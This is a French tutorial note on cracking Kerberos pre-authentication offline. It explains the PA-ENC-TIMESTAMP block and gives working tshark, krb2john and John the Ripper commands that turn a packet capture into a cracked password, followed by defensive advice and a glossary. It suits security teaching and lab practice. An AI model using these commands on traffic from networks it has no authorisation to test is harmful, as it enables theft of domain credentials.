# Kerberos : casser la pré-authentification

## Le concept

Lors de l'authentification Kerberos, le client prouve qu'il connaît son mot de
passe en chiffrant un **horodatage** avec une clé dérivée de ce mot de passe
(bloc `PA-ENC-TIMESTAMP` de l'`AS-REQ`). Ce bloc circule sur le réseau. Capturé,
il se casse **hors ligne** par dictionnaire : pour chaque mot testé, on dérive
la clé, on déchiffre, et un horodatage valide signale le bon mot de passe.
Le nom d'utilisateur, lui, voyage **en clair** : le serveur doit savoir qui
demande à s'authentifier.

## Repérage

- Port **88** (TCP/UDP).
- Séquence typique : `AS-REQ` → `KRB5KDC_ERR_PREAUTH_REQUIRED` → `AS-REQ`.
  Le **2e `AS-REQ`** porte le `PA-ENC-TIMESTAMP` : c'est la cible.
- Champs lisibles dans ce paquet : `CNameString` (utilisateur), `realm` (domaine).
- `etype` dans le bloc : `18` = AES256, `17` = AES128, `23` = RC4.

## Commandes

```
kerberos                  # filtre Wireshark : isole les paquets Kerberos
```

Dans le 2e AS-REQ : un bloc de pré-authentification chiffré (PA-ENC-TIMESTAMP) à casser, et le nom d'utilisateur + le domaine, lisibles en clair.

```bash
# Exporter les paquets Kerberos en XML (format lu par krb2john)
tshark -r capture.pcapng -Y kerberos -T pdml > capture.xml
# (équivalent GUI : File > Export Packet Dissections > As PDML)
```

```bash
# Extraire le hash au format John
/opt/tools/john/run/krb2john.py capture.xml > hash.txt
cat hash.txt                       # → user:$krb5pa$18$user$REALM$cipher
```

```bash
# Casser par dictionnaire
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt               # réaffiche user:motdepasse
```

Le type de chiffrement, l'identité et le critère « c'est un horodatage » sont
déjà **dans** la ligne `$krb5pa$` : John les lit seul, rien à passer en option.

## Défense

- Imposer des mots de passe **longs et aléatoires** : un mot de passe faible
  tombe même avec un chiffrement solide.
- Préférer AES (`etype` 17/18) à RC4 (`23`), plus coûteux à attaquer.
- Surveiller le trafic Kerberos (captures, répétitions d'`AS-REQ` suspectes).
- Ne pas exposer inutilement le KDC ; segmenter le réseau.

## Termes

- **KDC** : serveur qui délivre les tickets (le contrôleur de domaine).
- **AS-REQ / AS-REP** : demande et réponse d'authentification initiale.
- **Pré-authentification** : preuve chiffrée (horodatage) jointe à l'`AS-REQ`.
- **etype** : identifiant de l'algorithme de chiffrement utilisé.
- **Attaque par dictionnaire** : test d'une liste de mots de passe courants,
  par opposition au brute force exhaustif.
- **Hors ligne** : cassage mené sur le hash capturé, sans contact avec le serveur.
- **PA-ENC-TIMESTAMP** : horodatage chiffré avec une clé dérivée du mot de passe, joint à l'AS-REQ comme preuve de pré-authentification. C'est le bloc que l'on casse.